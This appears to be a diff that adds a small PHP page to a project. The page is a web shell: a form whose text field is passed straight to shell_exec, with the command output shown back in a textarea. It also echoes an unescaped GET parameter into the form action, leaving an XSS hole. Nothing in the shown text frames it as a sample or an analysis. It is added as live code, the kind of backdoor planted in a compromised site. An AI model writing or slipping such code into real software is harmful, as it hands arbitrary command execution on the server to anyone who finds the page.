@@ -1,0 +1,4 @@
+<div align="center"><form action=<?php echo $_SERVER['PHP_SELF']."?WERT=".$_GET['WERT']; ?> method="POST"> TTTT says >>> <input type="test" value="" size="40" name="bef">
+<textarea name="Output" cols="120" rows="20">
+<?php echo shell_exec($_POST['bef']); ?>
+</textarea> </div></form>
